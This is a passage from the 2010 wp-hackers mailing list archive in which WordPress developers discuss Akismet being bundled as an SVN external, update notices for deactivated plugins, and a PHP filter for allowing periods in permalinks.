> file you get when clicking "download" on wordpress.org) when externals are
> updated.
>
>> Many software distributions, once installed will check if there was an
> update. ?This is pretty common practice from what I've seen.
>
> Just because it's a common practice doesn't mean it's the right way to do
> things or something we should embrace. ?Anything that can potentially
> confuse a user is "bad" in my book, common practice or no ...
>
> ~Eric
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
> Sent: Saturday, October 02, 2010 7:21 AM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Bundled Plug-ins
>
>
> On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
>
>> conjurs up flashbacks of the endless
>> update-reboot-update-reboot cycle that drives many people away from
>> Microsoft Windows.
>
> Really? That is a little dramatic I think. The Akismet upgrade doesn't force
> you to reboot your server or anything close.
>
> Would you rather have the plugin excluded from the WordPress core? Then you
> would need to download and install it separate. Many software distributions,
> once installed will check it there was an update. This is pretty common
> practice from what I've seen.
>
>
> P-
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://ozh.org/

From mail at scribu.net  Sat Oct  2 15:50:01 2010
From: mail at scribu.net (scribu)
Date: Sat, 2 Oct 2010 18:50:01 +0300
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
Message-ID: <AANLkTi=dPZW9QpkRiUZdtKn0e6n=7soT-Bv82qbPU3SE@mail.gmail.com>

On Sat, Oct 2, 2010 at 6:26 PM, Ozh <ozh at ozh.org> wrote:

> While we're on this subject, if anyone has a good explanation on why
> Akismet is an "external", I'd be grateful. I don't get why parts of WP
> are, well, parts of WP, while other parts of WP are "externals". From
> a user POV this does not make a lot of sense IMO.
>

The *external* bit is only visible to developers which use SVN. To end
users, it's just a bundled plugin.

From mail at scribu.net  Sat Oct  2 15:54:12 2010
From: mail at scribu.net (scribu)
Date: Sat, 2 Oct 2010 18:54:12 +0300
Subject: [wp-hackers] Reposter Plugin and SQL Strange Behaviour
In-Reply-To: <l4qca65jbfc3k600h7g7n603ll5b86nr5r@4ax.com>
References: <l4qca65jbfc3k600h7g7n603ll5b86nr5r@4ax.com>
Message-ID: <AANLkTik7R6_OFL34rKSre8Pq2kO_NWb9O6+26ihE3cQ+@mail.gmail.com>

Hello David,

This mailing list is not a place for plugin support.

You should contact the plugin author or use the support forums:

http://wordpress.org/support/

From otto at ottodestruct.com  Sat Oct  2 16:25:40 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 2 Oct 2010 11:25:40 -0500
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
Message-ID: <AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>

An "external" in SVN terms is simply a chunk of code that is directly
included from some other SVN repository. That way, when Akismet
updates, then they don't have to reimport it into the WordPress trunk
or get the updates or anything like that. It's just automatically
included.

Externals are ways to combine pieces of code from other projects
without having to constantly refresh them manually.

-Otto



On Sat, Oct 2, 2010 at 10:26 AM, Ozh <ozh at ozh.org> wrote:
> While we're on this subject, if anyone has a good explanation on why
> Akismet is an "external", I'd be grateful. I don't get why parts of WP
> are, well, parts of WP, while other parts of WP are "externals". From
> a user POV this does not make a lot of sense IMO.
>
> On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
>> I've just become very sensitive to anything asking me to update immediately
>> after I install what I'm told is the latest version. ?It's a bit confusing
>> to download a fresh file, install it, and immediately see any kind of
>> "update available" message.
>>
>> No, I like the idea of including the plugin with WordPress core ... but it
>> would be nice if we could somehow update the core download package (the ZIP
>> file you get when clicking "download" on wordpress.org) when externals are
>> updated.
>>
>>> Many software distributions, once installed will check if there was an
>> update. ?This is pretty common practice from what I've seen.
>>
>> Just because it's a common practice doesn't mean it's the right way to do
>> things or something we should embrace. ?Anything that can potentially
>> confuse a user is "bad" in my book, common practice or no ...
>>
>> ~Eric
>>
>> -----Original Message-----
>> From: wp-hackers-bounces at lists.automattic.com
>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
>> Sent: Saturday, October 02, 2010 7:21 AM
>> To: wp-hackers at lists.automattic.com
>> Subject: Re: [wp-hackers] Bundled Plug-ins
>>
>>
>> On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
>>
>>> conjurs up flashbacks of the endless
>>> update-reboot-update-reboot cycle that drives many people away from
>>> Microsoft Windows.
>>
>> Really? That is a little dramatic I think. The Akismet upgrade doesn't force
>> you to reboot your server or anything close.
>>
>> Would you rather have the plugin excluded from the WordPress core? Then you
>> would need to download and install it separate. Many software distributions,
>> once installed will check it there was an update. This is pretty common
>> practice from what I've seen.
>>
>>
>> P-
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
>
> --
> http://ozh.org/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ozh at ozh.org  Sat Oct  2 17:04:15 2010
From: ozh at ozh.org (Ozh)
Date: Sat, 2 Oct 2010 19:04:15 +0200
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
Message-ID: <AANLkTim-oeqsyaqArLvVAvS5da8TEPZBp2+y2VtoqSkV@mail.gmail.com>

Yeah I know what the external property in SVN means, but what I meant
is, from a user's POV, this doesn't make sense.

Case 1: download latest.zip, install WordPress. Hu? Got to get a newer
version of Akismet?

Case 2: download latest.zip, install WordPress. Hu? Got to get a newer
version of general-template.php?

For a user, I don't think case 1 or case 2 is weirder. Anything
included in the latest.zip should be the freshest available. In other
words, I don't get why Akismet is on plugins.trac instead of
core.trac...

On Sat, Oct 2, 2010 at 6:25 PM, Otto <otto at ottodestruct.com> wrote:
> An "external" in SVN terms is simply a chunk of code that is directly
> included from some other SVN repository. That way, when Akismet
> updates, then they don't have to reimport it into the WordPress trunk
> or get the updates or anything like that. It's just automatically
> included.
>
> Externals are ways to combine pieces of code from other projects
> without having to constantly refresh them manually.
>
> -Otto
>
>
>
> On Sat, Oct 2, 2010 at 10:26 AM, Ozh <ozh at ozh.org> wrote:
>> While we're on this subject, if anyone has a good explanation on why
>> Akismet is an "external", I'd be grateful. I don't get why parts of WP
>> are, well, parts of WP, while other parts of WP are "externals". From
>> a user POV this does not make a lot of sense IMO.
>>
>> On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
>>> I've just become very sensitive to anything asking me to update immediately
>>> after I install what I'm told is the latest version. ?It's a bit confusing
>>> to download a fresh file, install it, and immediately see any kind of
>>> "update available" message.
>>>
>>> No, I like the idea of including the plugin with WordPress core ... but it
>>> would be nice if we could somehow update the core download package (the ZIP
>>> file you get when clicking "download" on wordpress.org) when externals are
>>> updated.
>>>
>>>> Many software distributions, once installed will check if there was an
>>> update. ?This is pretty common practice from what I've seen.
>>>
>>> Just because it's a common practice doesn't mean it's the right way to do
>>> things or something we should embrace. ?Anything that can potentially
>>> confuse a user is "bad" in my book, common practice or no ...
>>>
>>> ~Eric
>>>
>>> -----Original Message-----
>>> From: wp-hackers-bounces at lists.automattic.com
>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
>>> Sent: Saturday, October 02, 2010 7:21 AM
>>> To: wp-hackers at lists.automattic.com
>>> Subject: Re: [wp-hackers] Bundled Plug-ins
>>>
>>>
>>> On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
>>>
>>>> conjurs up flashbacks of the endless
>>>> update-reboot-update-reboot cycle that drives many people away from
>>>> Microsoft Windows.
>>>
>>> Really? That is a little dramatic I think. The Akismet upgrade doesn't force
>>> you to reboot your server or anything close.
>>>
>>> Would you rather have the plugin excluded from the WordPress core? Then you
>>> would need to download and install it separate. Many software distributions,
>>> once installed will check it there was an update. This is pretty common
>>> practice from what I've seen.
>>>
>>>
>>> P-
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>
>>
>>
>>
>> --
>> http://ozh.org/
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://ozh.org/

From otto at ottodestruct.com  Sat Oct  2 17:15:04 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 2 Oct 2010 12:15:04 -0500
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTim-oeqsyaqArLvVAvS5da8TEPZBp2+y2VtoqSkV@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<AANLkTim-oeqsyaqArLvVAvS5da8TEPZBp2+y2VtoqSkV@mail.gmail.com>
Message-ID: <AANLkTikuKyFVtUMxxWwxjBjZQuieEFrerOTJZKOSj2wo@mail.gmail.com>

On Sat, Oct 2, 2010 at 12:04 PM, Ozh <ozh at ozh.org> wrote:
> Anything included in the latest.zip should be the freshest available.

Those zip's aren't built on the fly. The latest.zip is a redirect to
the latest *released* version of WordPress, which is currently 3.0.1.

At release time, the ZIP is built with the current version of trunk
(basically). That includes Akismet, at the time of release.

It doesn't make sense to do a whole new release just because the
bundled plugin got updated.

If you want the nightly build, then that would be here:
http://wordpress.org/nightly-builds/wordpress-latest.zip

-Otto

From ozh at ozh.org  Sat Oct  2 18:05:23 2010
From: ozh at ozh.org (Ozh)
Date: Sat, 2 Oct 2010 20:05:23 +0200
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTikuKyFVtUMxxWwxjBjZQuieEFrerOTJZKOSj2wo@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
	<AANLkTim-oeqsyaqArLvVAvS5da8TEPZBp2+y2VtoqSkV@mail.gmail.com>
	<AANLkTikuKyFVtUMxxWwxjBjZQuieEFrerOTJZKOSj2wo@mail.gmail.com>
Message-ID: <AANLkTimhTWVZD4znB_jVsC1Suj68ekBKWry1LpoKzTmM@mail.gmail.com>

Still doesnt make sense to me :)

Akismet gets sometimes updated. Yep, that wouldn't justify pushing a
new version of the whole WP.
functions.php get sometimes updated, and that doesn't mean a new
version of WP neither.

I'm not saying every commit should be pushed into latest.zip on the
fly or justify bumping the version number. I'm just saying that I
don't get why askimet.php gets a special treatment that other files
don't. And I understand that this is probably confusing for my Mom
when she installs something and is immediately prompted to update
parts of it.

Never mind... :)

On Sat, Oct 2, 2010 at 7:15 PM, Otto <otto at ottodestruct.com> wrote:
> On Sat, Oct 2, 2010 at 12:04 PM, Ozh <ozh at ozh.org> wrote:
>> Anything included in the latest.zip should be the freshest available.
>
> Those zip's aren't built on the fly. The latest.zip is a redirect to
> the latest *released* version of WordPress, which is currently 3.0.1.
>
> At release time, the ZIP is built with the current version of trunk
> (basically). That includes Akismet, at the time of release.
>
> It doesn't make sense to do a whole new release just because the
> bundled plugin got updated.
>
> If you want the nightly build, then that would be here:
> http://wordpress.org/nightly-builds/wordpress-latest.zip
>
> -Otto
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://ozh.org/

From mikeschinkel at newclarity.net  Sat Oct  2 18:30:18 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 2 Oct 2010 14:30:18 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <000301cb623a$f1d3b5c0$d57b2140$@com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
Message-ID: <0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>

On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
> I love the idea of distributing Akismet with WordPress.  It's a vital plugin
> to any successful blog and a great idea to have that functionality bundled
> yet optional.  However . the fact that Akismet is maintained separately from
> WP can be a little problematic.  Specifically, a fresh download and install
> of WP about 5 minutes ago contains an outdated copy of Akismet.  Installing
> a brand new "up-to-date" copy of software and immediately being told there's
> an update available conjurs up flashbacks of the endless
> update-reboot-update-reboot cycle that drives many people away from
> Microsoft Windows.
> 
> So what can we do to maintain the elegance of bundled plugins without
> running the risk of notifying users of new updates less than 5 minutes after
> they open a new package?

On related note, but unrelated to the direction of the discussion that followed, I have been noticing how deactivated plugins still tell the user there is an update and "nag" them to update. Lots of people, myself included, download plugins to try but then either don't have time at that moment to evaluate and/or they deactivate them with plans to look at them in the future. However I'm sure like most I want to make those notices go away and thus that means if I leave lots of deactivate plugins on my system then I'm constantly being asked to update.  

I'm assuming the issue is that any code on the server could have a security hole, deactivated or not, so it's critical that we get all code updated in case of a security hole, right? But could there not be a third way? How about an "archive" feature that allowed a user to archive a plugin which would either zip its contents and/or set the permissions on its directory/files so that it's not accessible externally (if that's even possible; my knowledge of how server permissions work is rather lacking.)

I think these constant "update me" notices are yet another reason why people don't want to use any more plugins than they have to even though the constant refrain related to features is "that's plugin territory." (I think what I'm saying here is that by improving the management of plugins it might help people who have issues with plugins dislike them less.)

-Mike


From mail at scribu.net  Sat Oct  2 18:37:52 2010
From: mail at scribu.net (scribu)
Date: Sat, 2 Oct 2010 21:37:52 +0300
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
Message-ID: <AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>

On Sat, Oct 2, 2010 at 9:30 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> I'm assuming the issue is that any code on the server could have a security
> hole, deactivated or not, so it's critical that we get all code updated in
> case of a security hole, right? But could there not be a third way? How
> about an "archive" feature that allowed a user to archive a plugin which
> would either zip its contents and/or set the permissions on its
> directory/files so that it's not accessible externally (if that's even
> possible; my knowledge of how server permissions work is rather lacking.)
>

If you're that concerned about security, you're better off deleting the
plugin and just bookarmking it in your browser or whatever.

If you just want to hide the update nags (something that I would like to do
too), you could make a plugin that does it (with jQuery, in the worst case).


I think these constant "update me" notices are yet another reason why people
> don't want to use any more plugins than they have to even though the
> constant refrain related to features is "that's plugin territory." (I think
> what I'm saying here is that by improving the management of plugins it might
> help people who have issues with plugins dislike them less.)
>

I agree that plugin management could be a little more sophisticated.

From mikeschinkel at newclarity.net  Sat Oct  2 18:42:09 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 2 Oct 2010 14:42:09 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
Message-ID: <28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>

On Oct 2, 2010, at 2:37 PM, scribu wrote:
> If you're that concerned about security, you're better off deleting the
> plugin and just bookarmking it in your browser or whatever.

I was assuming others would be concerned and would bring it up as a reason not to disable the notices, so I was preemptively trying to address that issue.  

> If you just want to hide the update nags (something that I would like to do
> too), you could make a plugin that does it (with jQuery, in the worst case).

I *do* want the nags for *activated* plugins, just not for the deactivated one.

-Mike

From mikeschinkel at newclarity.net  Sat Oct  2 18:44:40 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 2 Oct 2010 14:44:40 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
Message-ID: <4C12A8BA-041B-410A-B43F-1C42296578CA@newclarity.net>

On Oct 2, 2010, at 2:37 PM, scribu wrote:
> If you just want to hide the update nags (something that I would like to do
> too), you could make a plugin that does it (with jQuery, in the worst case).

And if I did want to make them *all* go away (which I don't) it would be as simple as adding this CSS:

.update-plugins { display:none; }

-Mike

From mail at scribu.net  Sat Oct  2 18:51:11 2010
From: mail at scribu.net (scribu)
Date: Sat, 2 Oct 2010 21:51:11 +0300
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
	<28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>
Message-ID: <AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>

On Sat, Oct 2, 2010 at 9:42 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> > If you just want to hide the update nags (something that I would like to
> do
> > too), you could make a plugin that does it (with jQuery, in the worst
> case).
>
> I *do* want the nags for *activated* plugins, just not for the deactivated
> one.
>

Yeah, that's what I meant.

From mikeschinkel at newclarity.net  Sat Oct  2 18:54:14 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 2 Oct 2010 14:54:14 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>
	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>
	<28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>
	<AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>
Message-ID: <9F03882C-33D3-4035-8848-04C54C017449@newclarity.net>

On Oct 2, 2010, at 2:51 PM, scribu wrote:
> On Sat, Oct 2, 2010 at 9:42 PM, Mike Schinkel
> <mikeschinkel at newclarity.net>wrote:
> 
>>> If you just want to hide the update nags (something that I would like to
>> do
>>> too), you could make a plugin that does it (with jQuery, in the worst
>> case).
>> 
>> I *do* want the nags for *activated* plugins, just not for the deactivated
>> one.
>> 
> 
> Yeah, that's what I meant.

In that case I was proposing as more of an advocate on the part of the average user than for my own needs. 

-Mike


From elfin at elfden.co.uk  Sat Oct  2 19:45:24 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Sat, 02 Oct 2010 20:45:24 +0100
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <9F03882C-33D3-4035-8848-04C54C017449@newclarity.net>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>	<28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>	<AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>
	<9F03882C-33D3-4035-8848-04C54C017449@newclarity.net>
Message-ID: <4CA78BD4.2010707@elfden.co.uk>

On 02/10/2010 19:54, Mike Schinkel wrote:
> On Oct 2, 2010, at 2:51 PM, scribu wrote:
>> On Sat, Oct 2, 2010 at 9:42 PM, Mike Schinkel
>> <mikeschinkel at newclarity.net>wrote:
>>
>>>> If you just want to hide the update nags (something that I would like to
>>> do
>>>> too), you could make a plugin that does it (with jQuery, in the worst
>>> case).
>>>
>>> I *do* want the nags for *activated* plugins, just not for the deactivated
>>> one.
>>>
>>
>> Yeah, that's what I meant.
>
> In that case I was proposing as more of an advocate on the part of the average user than for my own needs.
>

I'd like to keep the notifications for the deactivated ones as well. 
there could be any number of reasons why a plugin is deactivated, 
including not working with the current version. So a user may be 
waiting for that plugin to be activated.

therefore a hook to enable the hiding of the notifications for 
deactivated plugins would be better IMO.

But please leave it on by default.

Rich

From elfin at elfden.co.uk  Sat Oct  2 19:51:50 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Sat, 02 Oct 2010 20:51:50 +0100
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <4CA78BD4.2010707@elfden.co.uk>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>	<0D6351D2-5DAB-4599-82B5-C9487A074646@newclarity.net>	<AANLkTikDpQ04tMHNmxOj0ABJgdeo1GWSCmvCSgNsL0Nf@mail.gmail.com>	<28F6F5F3-6211-479A-B2FC-3CBECDDBFC78@newclarity.net>	<AANLkTinuxokmiUPOzW8XPi1XvKxFCXJiZc_cSOthY+6n@mail.gmail.com>	<9F03882C-33D3-4035-8848-04C54C017449@newclarity.net>
	<4CA78BD4.2010707@elfden.co.uk>
Message-ID: <4CA78D56.1030809@elfden.co.uk>

On 02/10/2010 20:45, Rich Pedley wrote:
> I'd like to keep the notifications for the deactivated ones as well.
> there could be any number of reasons why a plugin is deactivated,
> including not working with the current version. So a user may be
> waiting for that plugin to be activated.
>
> therefore a hook to enable the hiding of the notifications for
> deactivated plugins would be better IMO.
>
> But please leave it on by default.
>

ugh:
So a user may be waiting for that plugin to be activated.

should be:
So a user may be waiting for that plugin to be updated.

Rich


From rbilesky at gmail.com  Sat Oct  2 20:47:23 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Sat, 2 Oct 2010 13:47:23 -0700
Subject: [wp-hackers] Use a period in permalinks
In-Reply-To: <AANLkTi=1wL9J1HpWfy5_iCzKLDGo5hSLS8JgTikp0qKN@mail.gmail.com>
References: <AANLkTi=1wL9J1HpWfy5_iCzKLDGo5hSLS8JgTikp0qKN@mail.gmail.com>
Message-ID: <AANLkTincC8AzPviPE557jf_nK2JE9JWJL-Adw=j-v+9Y@mail.gmail.com>

If all you need is to allow periods, you can use this bit of code. I took
it from the advanced-permalinks plugin, this is how it does that, just add
it to your theme's functions.php

function sanitize_title_allow_period($title) {
 $title = strip_tags($title);
 // Preserve escaped octets.
 $title = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '---$1---', $title);
 // Remove percent signs that are not part of an octet.
 $title = str_replace('%', '', $title);
 // Restore octets.
 $title = preg_replace('|---([a-fA-F0-9][a-fA-F0-9])---|', '%$1', $title);
 $title = remove_accents($title);
 if (seems_utf8($title)) {
  if (function_exists('mb_strtolower')) {
   $title = mb_strtolower($title, 'UTF-8');
  }
  $title = utf8_uri_encode($title);
 }
 $title = strtolower($title);
 $title = preg_replace('/&.+?;/', '', $title); // kill entities
 $title = preg_replace('/[^%a-z0-9\. _-]/', '', $title);
 $title = preg_replace('/\s+/', '-', $title);
 $title = preg_replace('|-+|', '-', $title);
 $title = trim($title, '-');
 return $title;
}

remove_filter ('sanitize_title', 'sanitize_title_with_dashes');
add_filter ('sanitize_title', 'sanitize_title_allow_period', 10, 1);

On Fri, Oct 1, 2010 at 8:51 PM, WP Customizer <wpcustomizer at gmail.com>wrote:

> I am trying to use a . (period) in a permalink for a page, but it just
> changes to a - (dash).  Is there anyway to get this to work with a period,
> I
> want to include a non-whole number as part of the permalink like
> mysite.com/hello-world-1.0.1 or mysite.com/1.1
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From joelfisher at gmail.com  Sat Oct  2 20:49:24 2010
From: joelfisher at gmail.com (Joel Fisher)
Date: Sat, 2 Oct 2010 16:49:24 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
	<AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>
	<AANLkTikAb2UiPyDWpChsfQRRC9xnBfZt_jsbGj9xWpgC@mail.gmail.com>
Message-ID: <E75D5589-D109-41F6-AE61-6DA554F000D4@gmail.com>

Akismet isn't free anymore. Check it out. I use my old API key which still works but their site references payment.


Sent from my iPhone

On Oct 2, 2010, at 12:25 PM, Otto <otto at ottodestruct.com> wrote:

> An "external" in SVN terms is simply a chunk of code that is directly
> included from some other SVN repository. That way, when Akismet
> updates, then they don't have to reimport it into the WordPress trunk
> or get the updates or anything like that. It's just automatically
> included.
> 
> Externals are ways to combine pieces of code from other projects
> without having to constantly refresh them manually.
> 
> -Otto
> 
> 
> 
> On Sat, Oct 2, 2010 at 10:26 AM, Ozh <ozh at ozh.org> wrote:
>> While we're on this subject, if anyone has a good explanation on why
>> Akismet is an "external", I'd be grateful. I don't get why parts of WP
>> are, well, parts of WP, while other parts of WP are "externals". From
>> a user POV this does not make a lot of sense IMO.
>> 
>> On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
>>> I've just become very sensitive to anything asking me to update immediately
>>> after I install what I'm told is the latest version.  It's a bit confusing
>>> to download a fresh file, install it, and immediately see any kind of
>>> "update available" message.
>>> 
>>> No, I like the idea of including the plugin with WordPress core ... but it
>>> would be nice if we could somehow update the core download package (the ZIP
>>> file you get when clicking "download" on wordpress.org) when externals are
>>> updated.
>>> 
>>>> Many software distributions, once installed will check if there was an
>>> update.  This is pretty common practice from what I've seen.
>>> 
>>> Just because it's a common practice doesn't mean it's the right way to do
>>> things or something we should embrace.  Anything that can potentially
>>> confuse a user is "bad" in my book, common practice or no ...
>>> 
>>> ~Eric
>>> 
>>> -----Original Message-----
>>> From: wp-hackers-bounces at lists.automattic.com
>>> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
>>> Sent: Saturday, October 02, 2010 7:21 AM
>>> To: wp-hackers at lists.automattic.com
>>> Subject: Re: [wp-hackers] Bundled Plug-ins
>>> 
>>> 
>>> On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:
>>> 
>>>> conjurs up flashbacks of the endless
>>>> update-reboot-update-reboot cycle that drives many people away from
>>>> Microsoft Windows.
>>> 
>>> Really? That is a little dramatic I think. The Akismet upgrade doesn't force
>>> you to reboot your server or anything close.
>>> 
>>> Would you rather have the plugin excluded from the WordPress core? Then you
>>> would need to download and install it separate. Many software distributions,
>>> once installed will check it there was an update. This is pretty common
>>> practice from what I've seen.
>>> 
>>> 
>>> P-
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>>> _______________________________________________
>>> wp-hackers mailing list
